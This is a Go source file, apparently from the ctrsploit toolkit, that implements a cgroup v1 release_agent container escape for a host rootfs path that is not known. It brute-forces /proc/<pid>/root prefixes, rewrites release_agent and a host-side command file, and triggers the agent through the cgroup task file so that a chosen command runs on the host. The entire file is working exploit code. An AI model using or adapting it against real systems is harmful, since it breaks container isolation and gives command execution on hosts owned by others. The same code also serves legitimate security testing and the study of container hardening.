package cgroupv1_release_agent_unknown_rootfs

import (
	"flag"
	"fmt"
	cgroupv1_release_agent "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent"
	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/ctrsploit/ctrsploit/pkg"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"

	"os"
	"os/exec"
	"strings"
	"time"
)

func Exploit() {
	defer os.Exit(0)

	flagSet := flag.NewFlagSet(ExpName, flag.ContinueOnError)
	var debug bool
	var cmd string
	flagSet.BoolVar(&debug, "debug", false, "")
	flagSet.StringVar(&cmd, "cmd", "", "")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	log.Logger.Debug("cmd: ", cmd)

	ReleaseAgentUnknownRootfs(cmd)
}

func ReleaseAgentUnknownRootfs(cmd string) {
	cgroupv1_release_agent.ReleaseAgentCommon(cmd, "",
		func(pathReleaseAgent, pathCmdOnHost, pathAddTask, pathOutputOnCtr string) (err error) {
			maxPid, err := pkg.MaxPid()
			if err != nil {
				return
			}
			old := pathOutputOnCtr
			for pid := 2; pid < maxPid; pid++ {
				//log.Logger.Debugf("trying %d", pid)
				if pid%100 == 0 {
					log.Logger.Infof("trying %d", pid)
				}
				pathProcRoot := fmt.Sprintf("/proc/%d/root", pid)
				err = os.WriteFile(pathReleaseAgent, []byte(pathProcRoot+pathCmdOnHost), 0755)
				if err != nil {
					awesome_error.CheckErr(err)
					return
				}

				{ // make err shadow
					err := internal.ReplaceContent(pathCmdOnHost, []byte(old), []byte(pathProcRoot+pathOutputOnCtr))
					old = pathProcRoot + pathOutputOnCtr
					if err != nil {
						if strings.Contains(err.Error(), "text file busy") {
							log.Logger.Debug("seems hit the timing")
							time.Sleep(time.Second)
						} else {
							awesome_error.CheckErr(err)
							return err
						}
					}
				}
				command := exec.Command("sh", "-c", fmt.Sprintf("echo $$ > %s", pathAddTask))
				awesome_error.CheckFatal(command.Run())
				if internal.CheckPathExists(pathOutputOnCtr) {
					log.Logger.Infof("found %s, success", pathOutputOnCtr)
					break
				}
			}
			return
		})
}
